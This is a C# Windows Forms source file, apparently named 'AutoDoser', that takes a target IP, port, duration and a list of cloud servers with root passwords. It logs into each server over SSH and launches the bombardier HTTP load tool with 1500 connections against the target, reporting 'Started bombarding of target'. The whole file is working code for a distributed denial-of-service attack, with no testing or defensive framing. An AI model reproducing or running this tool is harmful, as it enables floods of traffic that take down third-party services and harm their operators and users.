using Renci.SshNet;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace AutoDoser
{
    public partial class Form1 : Form
    {
        string targetAdress;
        string duration;
        List<Droplet> Droplets = new List<Droplet>();

        public Form1()
        {
            InitializeComponent();
        }

        public bool IsValid(string IP)
        {
            int size = IP.Length;
            var normalSplit = IP.Split('.');

            if (IP.Split(new char[] { '.' }, StringSplitOptions.RemoveEmptyEntries).Length != normalSplit.Length 
                || normalSplit.Length != 4) return false;

            foreach(var num in normalSplit)
            {
                if (!int.TryParse(num, out int temp)) return false;
            }
            return true;
        }

        private void button1_Click(object sender, EventArgs e)
        {
            InputData();
            foreach(var Droplet in Droplets)
            {
                using (var client = new SshClient(Droplet.IP, "root", Droplet.Password))
                { 
                    client.Connect();
                    client.RunCommand($"docker run -ti --rm alpine/bombardier -c 1500 -d {duration} -l {targetAdress}");

                    string message = $"Started bombarding of target by {Droplet.IP}";
                    string caption = $"{Droplet.IP} started";
                    MessageBoxButtons buttons = MessageBoxButtons.OK;
                    DialogResult result;

                    // Displays the MessageBox.
                    result = MessageBox.Show(message, caption, buttons);

                    client.Disconnect();
                }
            }



        }

        private void InputData()
        {
            var text = textBox3.Text.Replace("\r", "").Split('\n');
            var rawDuration = textBox5.Text;
            var samePassword = textBox2.Text;
            var isSamePassword = samePassword != String.Empty;
            var target = textBox1.Text;

            try
            {
                //main IP
                if (!IsValid(target))
                {
                    throw new Exception();
                }

                //Port and full adress
                if (textBox4.Text != String.Empty)
                {
                    if (int.TryParse(textBox4.Text, out int port))
                    {
                        targetAdress = target.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries)[0] + ':' + port.ToString();
                    }
                    else
                    {
                        throw new Exception();
                    }
                }
                else
                {
                    targetAdress = target;
                }

                //Duration
                if (rawDuration != String.Empty && int.TryParse(rawDuration, out int D))
                {
                    duration = D.ToString() + 's';
                }
                else throw new Exception();

                //Droplets
                foreach (var line in text)
                {
                    var temp = line.Split(new char[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                    if (isSamePassword)
                    {
                        if (!IsValid(temp[0])) throw new Exception();
                        Droplets.Add(new Droplet(temp[0], samePassword));
                    }
                    else
                    {
                        if (!IsValid(temp[0])) throw new Exception();
                        Droplets.Add(new Droplet(temp[0], temp[1]));
                    }
                }
            }
            catch (Exception)
            {
                string message = "Wrong data. Please, try again";
                string caption = "Error";
                MessageBoxButtons buttons = MessageBoxButtons.OK;
                DialogResult result;

                // Displays the MessageBox.
                result = MessageBox.Show(message, caption, buttons);
            }
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {
            if(textBox2.Text != String.Empty)
            {
                label4.Visible = false;
                return;
            }
            label4.Visible = true;
        }
    }
}
